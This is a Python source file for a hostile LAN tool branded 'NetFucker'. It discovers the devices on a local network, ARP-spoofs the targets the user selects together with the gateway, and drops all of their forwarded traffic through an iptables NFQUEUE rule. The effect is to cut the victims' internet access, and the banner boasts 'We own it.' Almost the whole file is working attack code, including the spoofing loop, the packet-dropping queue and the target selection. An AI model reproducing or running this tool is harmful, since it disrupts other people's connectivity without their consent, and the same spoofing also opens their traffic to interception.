from UpdaterFiles.auto_updater import current_platform, Updater, has_root
from sys import exit, executable
from UpdaterFiles.auto_updater import Appearance as App
from os import execv, get_terminal_size
from subprocess import call
try:
    current_platform.determine_platform()
    if not has_root():
        print(f"{App.NeTfUcKeR()}{App.wut()} Please run as Root... Quitting!!")
        exit(1)
    Updater.updating()
    Updater.update_lib("wheel")
    Updater.update_lib("scapy")
    Updater.update_lib("netifaces")
    Updater.update_lib("netfilterqueue")
    Updater.update_lib("colorama")
    Updater.update_lib("termcolor")
    Updater.update_lib("keyboard")
    import scapy.all as scapy
    import netifaces
    import netfilterqueue
    from configparser import ConfigParser
    import threading
    import time
    from colorama import init, Fore, Back, Style
    from termcolor import colored

    init(autoreset=True)

    config = ConfigParser(allow_no_value=False, default_section="DEFAULT")

    def NeTfUcKeR():
        return "{}[{}N{}e{}t{}F{}u{}c{}K{}e{}r{}]".format(Fore.WHITE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.WHITE)

    def NeTfUcKeRNo_Tag():
        return "{}N{}e{}t{}F{}u{}c{}K{}e{}r{}".format(Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.WHITE)

    def print_DiscoveringStage():
        print("{}=================={}[{}D{}I{}S{}C{}O{}V{}E{}R{}Y{}S{}T{}A{}G{}E{}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.GREEN,Fore.GREEN))

    def print_AttackingStage():
        print("\n{}=================={}[{} A {}T {}T {}A {}C {}K {}I {}N {}G    {}S {}T {}A {}G {}E {}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.GREEN,Fore.GREEN), end="\r")

    def print_Important():
        print("{}=================={}[{} I {}M {}P {}O {}R {}T {}A {}N {}T {}]{}==================".format(Fore.GREEN,Fore.GREEN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.LIGHTGREEN_EX,Fore.MAGENTA,Fore.CYAN,Fore.BLUE,Fore.RED,Fore.YELLOW,Fore.GREEN,Fore.GREEN))


    class Appearance:
        def wut():
            return "{}[{}!{}]".format(Fore.WHITE,Fore.RED,Fore.WHITE)

        def huh():
            return "{}[{}?{}]".format(Fore.WHITE,Fore.LIGHTBLUE_EX,Fore.WHITE)

        def hey():
            return "{}[{}+{}]".format(Fore.WHITE,Fore.LIGHTGREEN_EX,Fore.WHITE)

        def printBanner():
            if get_terminal_size().columns >= 122:
                print(f"""{Fore.RED}
                    :::!~!!!!!:.
                .xUHWH!! !!?M88WHX:.
            .X*#M@$!!  !X!M$$$$$$WWx:.
            :!!!!!!?H! :!$!$$$$$$$$$$8X:
            !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
            :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
            ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
            !:~~~ .:!M"T#$$$$WX??#MRRMMM!
            ~?WuxiW*`   `"#$$$$8!!!!??!!!
            :X- M$$$$       `"T#$T~!8$WUXU~
        :%`  ~#$$$m:        ~!~ ?$$$$$$
        :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`      ███╗   ██╗███████╗████████╗███████╗██╗   ██╗ ██████╗██╗  ██╗███████╗██████╗ 
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~       ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██║   ██║██╔════╝██║ ██╔╝██╔════╝██╔══██╗
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `          ██╔██╗ ██║█████╗     ██║   █████╗  ██║   ██║██║     █████╔╝ █████╗  ██████╔╝
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!             ██║╚██╗██║██╔══╝     ██║   ██╔══╝  ██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
$R@i.~~ !     :   ~$$$$$B$$en:``              ██║ ╚████║███████╗   ██║   ██║     ╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║
?MXT@Wx.~    :     ~"##*$$$$M~                ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
{Fore.LIGHTGREEN_EX}
We DGAF about your internet connection. We own it.""")
            else:
                print(f"{Fore.LIGHTBLACK_EX}Not printing banner: Current terminal width too small\n{Fore.RED}NETFUCKER\n{Fore.LIGHTGREEN_EX}We DGAF about your internet connection. We own it.")
            return True # It went through fine. Quit this function


    def gateway_address():
        gateways = netifaces.gateways()
        default_address = gateways["default"][netifaces.AF_INET][0]
        return default_address


    def connected_clients(gateway_address, ip_range):
        arp_request = scapy.ARP(pdst=ip_range)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        clients = []
        for client in response:
            client_info = {"ip" : client[1].psrc, "mac" : client[1].src}
            clients.append(client_info)
        return clients


    class ARPSpoof:
        def __init__(self, target, ip_range, gateway):
            self._to_spoof = False
            self.target = target
            self.gateway = gateway

        def send_spoof_packet(self, target, spoof_ip):
            packet = scapy.ARP(
                op=2,
                pdst=target["ip"],
                hwdst=target["mac"],
                psrc=spoof_ip
            )
            scapy.send(packet, verbose=False)

        def send_unspoof_packet(self, target, source):
            packet = scapy.ARP(
                op=2,
                pdst=target["ip"],
                hwdst=target["mac"],
                psrc=source["ip"],
                hwsrc=source["mac"]
            )
            scapy.send(packet, verbose=False)

        def start(self, threaded=True):
            self._to_spoof = True
            if threaded:
                t = threading.Thread(target=self._start)
                t.start()
                return t
            else:
                self._start()

        def _start(self):
            while True:
                if not self._to_spoof:
                    break
                self.send_spoof_packet(self.target, self.gateway["ip"])
                self.send_spoof_packet(self.gateway, self.target["ip"])
                time.sleep(1)

        def stop(self):
            self._to_spoof = False
            time.sleep(1)
            self.send_unspoof_packet(self.target, self.gateway)
            self.send_unspoof_packet(self.gateway, self.target)


    def prompt_for_targets(clients):
        for i, client in enumerate(clients, 1):
            info = "[{index}]\t\t{ip_addr}\t\t{mac_addr}".format(
                index=i,
                ip_addr=client["ip"],
                mac_addr=client["mac"]
            )
            print(Fore.LIGHTYELLOW_EX + info)
        print(Fore.RED + "Pick a target by it's number on the left")
        indices = input(colored(f"{NeTfUcKeRNo_Tag()}>", attrs=["bold"]))
        if not indices:
            return []
        indices = map(int, indices.split(","))
        targets = [clients[index-1] for index in indices]
        return targets

    class Configuration:
        def read_config():
            config.read('./Configuration/config.ini')
            return True
        def get_IP_Range():
            Configuration.read_config()
            ip_range = config["DEFAULT"]["ip_range"]
            return ip_range

    class InternetControl:
        def __init__(self):
            self.targets = []

        def add_target(self, target):
            self.targets.append(target)

        def deny(self, threaded=True):
            call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(1, lambda packet: packet.drop())
            for target in self.targets:
                target.start()
            if threaded:
                t = threading.Thread(target=queue.run)
                t.start()
                return t
            else:
                queue.run()

        def restore(self):
            for target in self.targets:
                target.stop()
            call(["iptables", "--flush"])


    if __name__ == '__main__':
        Appearance.printBanner()
        print(colored(f"{NeTfUcKeR()}{Appearance.hey()} Running as Root", "green"))
        input(f"{NeTfUcKeR()}{Appearance.huh()} Press ENTER to continue...")
        gateway_ip = gateway_address()
        print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(" Gateway IP: {}".format(gateway_ip), "red"))
        
        ip_range = Configuration.get_IP_Range()
        clients = connected_clients(gateway_ip, ip_range)
        try:
            gateway = clients[0]
            targets = prompt_for_targets(clients[1:])
            network = InternetControl()
            for target in targets:
                print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(" Spoofing Target: {}", "green").format(target["ip"]))
                network.add_target(ARPSpoof(target, ip_range, gateway))
            try:
                network.deny(threaded=False)
            except KeyboardInterrupt:
                pass
            finally:
                network.restore()
        except IndexError:
            open_nano = input(f"""{NeTfUcKeR()}{Appearance.wut()} invalid IP range?\nOpen NANO CLI-Based text editor to rectify "./Configuration/config.ini"? ("""+Fore.LIGHTGREEN_EX+"Y"+Fore.WHITE+"/"+Fore.RED+"N"+Fore.WHITE+") > ")
            if open_nano.lower() in ["yes", "y"]:
                out = call(["nano", "./Configuration/config.ini"])
                if out == 0:
                    print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(f"IP Range updated", "green", attrs=["bold"]))
                    print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(f"Relaunching {NeTfUcKeRNo_Tag()} :D", "green", attrs=["bold"]))
                    time.sleep(2) # give a moment to let the user know what will happen.
                    execv(executable, ["python3", __file__])
                else:
                    print(f"{NeTfUcKeR()}{Appearance.wut()}" + colored(f"Some error occured... Try manually with editting it with some text editor", "red", attrs=["bold"]))
            elif open_nano.lower() in ["no", "n"]:
                print(f"{NeTfUcKeR()}{Appearance.hey()}" + colored(f"Very well. But you will need to edit the IP range regardlessly with some other text editor.\nExitting application.", "red", attrs=["bold"]))
                quit()
            else:
                print(f"{NeTfUcKeR()}{Appearance.wut()} ïncorrect reply... Quitting...")
                quit()

except KeyboardInterrupt:
    print(f"\n{NeTfUcKeR()}Control-C press detected. Exitting!")
    call(["iptables", "--flush"])
    quit()